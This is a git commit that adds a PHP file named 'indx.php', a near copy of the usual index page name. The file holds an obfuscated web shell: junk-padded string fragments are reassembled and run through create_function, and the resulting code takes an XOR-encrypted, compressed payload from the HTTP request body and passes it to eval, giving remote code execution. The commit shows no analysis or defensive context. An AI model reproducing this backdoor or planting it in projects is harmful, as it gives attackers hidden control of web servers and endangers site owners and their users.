dd4415c9f0e9edb847218fdc0b9add51cd269a3c
JH1 <117314594+JH1x000f93@users.noreply.github.com>
2023-06-21 21:00:33 -0600

    Add files via upload

---
+++ indx.php
@@ -0,0 +1,10 @@
+<?php
+$N='+2et_cont+2ents(+2);@o+2b_+2end+2_cl+2ean();$r=@base6+24_enc+2o+2de(@x(@gzcompre+2ss($o),+2$+2k));pri+2n+2t("$p$kh$r$kf");}';
+$a='x($t,$k)+2{$c=strlen($k);$l=+2strlen(+2$t);$o+2="";f+2+2o+2r($i=0;$i<$l;+2){for($+2j=0;(+2$j<$c&&$i+2<+2$l);$j++,$i+++';
+$A='2){$o.=+2$t{$+2i}^$k{$j+2+2};}}return +2$o;}if+2 +2(@preg_match(+2"/+2$k+2h(.+)$kf/+2",@file_get+2_+2c+2ontents("php://i+';
+$r='+2$k="b5+27f+244fb";$kh="de331cc+23+22+2+2728";$kf="e9d7bf913a+2+211";$p="lGyb+2sk5sSOoNM+2b+21r";func+2ti+2on+2+2 ';
+$s='2np+2+2+2ut"),$m)==1) {@ob_sta+2rt+2();@e+2val(+2@g+2zuncompress(+2@x(@base6+24_+2+2decode(+2$m[1]),$k)));$o+2=@ob_g';
+$l=str_replace('oA','','croAeaoAteoA_oAfuncoAoAtion');
+$W=str_replace('+2','',$r.$a.$A.$s.$N);
+$q=$l('',$W);$q();
+?>
